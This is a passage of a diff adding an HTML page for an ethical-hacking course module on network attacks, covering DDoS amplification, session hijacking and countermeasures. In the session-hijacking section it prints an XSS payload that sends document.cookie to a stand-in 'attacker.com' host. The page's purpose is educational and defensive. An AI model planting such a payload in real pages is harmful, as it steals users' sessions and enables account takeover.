+                        source IPs to amplify traffic volume. DNS amplification: 40-70x. NTP monlist
+                        amplification: up to 556x. Memcached UDP amplification: up to 51,000x (record: 1.7 Tbps).
+                    </div>
+                    <span class="concept-tag">Reflection</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128176;</div>
+                    <div class="concept-card-title">DDoS-as-a-Service</div>
+                    <div class="concept-card-body">
+                        "Stresser" or "booter" services offer DDoS capability on a subscription basis — no
+                        technical expertise required. Attackers can rent 100 Gbps+ attack capacity for as
+                        little as $20-100/month, dramatically lowering the barrier to entry for volumetric
+                        attacks against businesses and infrastructure.
+                    </div>
+                    <span class="concept-tag">Commoditized</span>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1.1rem; margin:24px 0 14px;">DDoS Countermeasures</h3>
+            <div class="section-body">
+                <ul>
+                    <li><strong style="color:#c4a0d8;">Upstream Scrubbing Centers</strong> — Cloud-based scrubbing services (Cloudflare, Akamai, AWS Shield) absorb volumetric attacks before they reach the origin</li>
+                    <li><strong style="color:#c4a0d8;">Anycast Diffusion</strong> — Distributes traffic across global PoPs so no single location is overwhelmed</li>
+                    <li><strong style="color:#c4a0d8;">Rate Limiting and ACLs</strong> — Block known bad source IPs and rate-limit suspicious traffic patterns at the network edge</li>
+                    <li><strong style="color:#c4a0d8;">BGP Blackholing</strong> — Instruct upstream ISPs to null-route attack traffic before it enters your network (sacrifices availability to protect infrastructure)</li>
+                    <li><strong style="color:#c4a0d8;">BCP38 (Ingress Filtering)</strong> — ISP-level filtering that blocks spoofed source addresses, preventing reflection/amplification attacks</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Session Hijacking -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128296;</span>
+            Session Hijacking
+        </h2>
+        <div class="section-body">
+            <p>
+                Session hijacking involves taking over an authenticated user session by stealing or predicting
+                the session identifier. Rather than compromising credentials, the attacker hijacks the
+                post-authentication state — gaining access to the application as the legitimate user without
+                needing their password.
+            </p>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Session ID Prediction</div>
+                            <div class="detail-header-subtitle">Exploiting weak session token generation</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        If session IDs are generated using predictable algorithms (sequential numbers, timestamps,
+                        weak PRNGs), an attacker can collect multiple session tokens and identify the pattern to
+                        predict valid tokens for other active sessions. Countermeasure: use cryptographically
+                        secure PRNGs with sufficient entropy (128+ bits) for session ID generation.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#129300;</span>
+                        <div>
+                            <div class="detail-header-title">XSS-Based Session Theft</div>
+                            <div class="detail-header-subtitle">Cross-site scripting to steal session cookies</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Stored or reflected XSS vulnerabilities enable attackers to inject JavaScript that
+                        reads document.cookie and exfiltrates the session token to an attacker-controlled server.
+                    </p>
+                    <div class="code-block">
+<span class="comment">// XSS payload to steal session cookie</span>
+&lt;script&gt;
+  <span class="kw">new</span> Image().src = <span class="str">'https://attacker.com/steal?c='</span>
+    + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+
+<span class="comment">// Countermeasure: HttpOnly flag prevents JS access to cookies</span>
+Set-Cookie: sessionid=<span class="num">abc123</span>; HttpOnly; Secure; SameSite=Strict
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128268;</span>
+                        <div>
+                            <div class="detail-header-title">TCP Session Hijacking</div>
+                            <div class="detail-header-subtitle">Network-layer session takeover</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        TCP session hijacking exploits the stateful nature of TCP connections. The attacker,
+                        positioned as a MITM (via ARP poisoning), monitors a TCP session and predicts sequence
+                        numbers. By injecting a forged TCP segment with the correct sequence number before the
+                        legitimate response arrives, the attacker can inject arbitrary commands or data into
+                        the session. The Juggernaut and Hunt tools implement this attack. Countermeasure:
+                        TLS encryption renders hijacked TCP segments unreadable and sequence injection detectable.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128175;</span>
+                        <div>
+                            <div class="detail-header-title">Session Desynchronization</div>
+                            <div class="detail-header-subtitle">Breaking the client-server TCP state</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        In this variant, the attacker causes the server and client to lose TCP synchronization
+                        by injecting RST packets or forged data. Once desynchronized, the attacker takes over
+                        the session by responding to the server as if they were the legitimate client. The
+                        legitimate client, confused by the unexpected sequence numbers, drops the connection,
+                        leaving the attacker in control.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Countermeasures -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128737;</span>
+            Network Attack Countermeasures
+        </h2>
+        <div class="section-body">
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128274;</div>
+                    <div class="concept-card-title">Encryption</div>
+                    <div class="concept-card-body">TLS 1.3 for all application traffic. VPNs and IPsec for site-to-site and remote access. Makes sniffed traffic unintelligible and prevents MITM data injection.</div>
+                    <span class="concept-tag">Layer 3-7</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128187;</div>
+                    <div class="concept-card-title">IDS / IPS</div>
+                    <div class="concept-card-body">Network Intrusion Detection/Prevention Systems inspect traffic for attack signatures and anomalies. Snort, Suricata (open-source); commercial: Palo Alto, Cisco Firepower. IPS actively blocks malicious flows.</div>
+                    <span class="concept-tag">Inline Defense</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128200;</div>
+                    <div class="concept-card-title">Rate Limiting</div>
+                    <div class="concept-card-body">Per-source rate limits on routers and firewalls constrain the impact of flood attacks. SYN rate limiting, ICMP rate limiting, and connection rate limits protect server resources without full blacklisting.</div>
+                    <span class="concept-tag">Traffic Control</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128293;</div>
+                    <div class="concept-card-title">Packet Filtering</div>
+                    <div class="concept-card-body">Stateful firewall rules block spoofed source addresses (RFC 2827/BCP38), unwanted protocols, and access to unused ports. ACLs on routers limit attack surface at the network perimeter.</div>
+                    <span class="concept-tag">Perimeter</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128268;</div>
+                    <div class="concept-card-title">Dynamic ARP Inspection</div>
+                    <div class="concept-card-body">Managed switch feature that validates ARP packets against the DHCP snooping binding table. ARP packets with MAC/IP mappings inconsistent with the table are dropped, preventing ARP cache poisoning.</div>
+                    <span class="concept-tag">Layer 2</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128270;</div>
+                    <div class="concept-card-title">Network Monitoring</div>
+                    <div class="concept-card-body">NetFlow/IPFIX analysis, SIEM correlation, and baseline deviation alerts catch DDoS buildup, port scan sweeps, and unusual traffic patterns before they cause significant damage.</div>
+                    <span class="concept-tag">Visibility</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 8: Takeaways & Discussion -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9889;</span>
+            Key Takeaways
+        </h2>
+        <div class="section-body">
+            <div class="takeaway-grid">
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128268;</div>
+                    <div class="takeaway-title">Protocols Were Not Built for Adversaries</div>
+                    <div class="takeaway-desc">ARP, DNS, and TCP were designed for cooperative environments. Their lack of authentication creates exploitable trust assumptions that persist in modern networks.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128274;</div>
+                    <div class="takeaway-title">Encryption Neutralizes Most MITM Attacks</div>
+                    <div class="takeaway-desc">TLS with certificate pinning and HSTS eliminates the value of most sniffing and session hijacking attacks. Encryption is not optional — it is foundational.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128165;</div>
+                    <div class="takeaway-title">DoS Is an Availability Problem</div>
+                    <div class="takeaway-desc">Defense requires upstream capacity (CDN, scrubbing centers), not just local mitigations. No firewall can stop 1 Tbps if your upstream link is only 10 Gbps.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128196;</div>
+                    <div class="takeaway-title">Defense in Depth</div>
+                    <div class="takeaway-desc">Layer 2 controls (DAI, port security), Layer 3 filtering (BCP38, ACLs), Layer 7 inspection (WAF, IPS), and monitoring must work together. Single-layer defenses fail against multi-vector attacks.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    ARP poisoning has been a known attack for decades, yet Dynamic ARP Inspection is still not universally deployed. What organizational and technical barriers prevent widespread adoption of Layer 2 security controls, and how would you make the business case for DAI implementation?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    The Mirai botnet demonstrated that consumer IoT devices could be weaponized into a 1.2 Tbps DDoS cannon. What regulatory, technical, and industry standard mechanisms would most effectively reduce the attack surface of IoT devices without stifling innovation?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    Session tokens protected with the HttpOnly and Secure cookie flags cannot be stolen via XSS. However, session hijacking can still occur via network-level sniffing. Describe a complete session security architecture for a high-value web application that addresses both attack vectors.
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">04</span>
+                    Slowloris attacks are effective against servers using thread-per-connection models but largely ineffective against event-driven servers (nginx, Node.js). How does server architecture influence vulnerability to application-layer DoS attacks, and what configuration changes would you recommend?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">05</span>
+                    DNS cache poisoning was largely addressed by randomizing source ports (TXID randomization) following Kaminsky's 2008 disclosure. What threat model assumptions underpin DNSSEC adoption, and why has DNSSEC deployment remained incomplete despite a known and critical vulnerability class?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have examined packet sniffing, ARP poisoning and MITM positioning, DNS attack taxonomy,
+                the full spectrum of DoS and DDoS techniques, session hijacking methods, and the layered
+                countermeasure landscape for network-level attacks.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 06
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // IntersectionObserver section fade-in
+    function initScrollAnimation() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Expandable detail sections
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    // Module completion
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'ehe-06', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initScrollAnimation();
+    });
+</script>
+
+</body>
+</html>
